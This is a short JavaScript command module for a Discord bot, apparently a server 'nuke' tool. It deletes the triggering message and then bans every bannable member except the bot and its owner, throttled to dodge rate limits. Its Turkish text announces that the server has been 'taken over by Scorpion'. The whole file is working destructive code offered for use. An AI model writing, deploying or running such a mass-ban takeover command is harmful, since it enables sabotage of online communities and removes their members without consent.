const delay = (ms) => new Promise((res) => setTimeout(res, ms));

module.exports = {
  name: "ban",
  description: "Sunucudaki tüm varlıkları hiçliğe sürgüne gönderir.",
  async execute(message, args, client, config) {
    await message.delete().catch(() => { });
    await message.guild.members.fetch();

    for (const member of message.guild.members.cache.values()) {
      if (member.id === client.user.id || member.id === config.ownerId) continue;
      if (member.bannable) {
        await member.ban({ reason: "Sistem Scorpion tarafından ele geçirildi. Artık burada yerin yok." }).catch(() => { });
        await delay(300);
      }
    }
  },
};
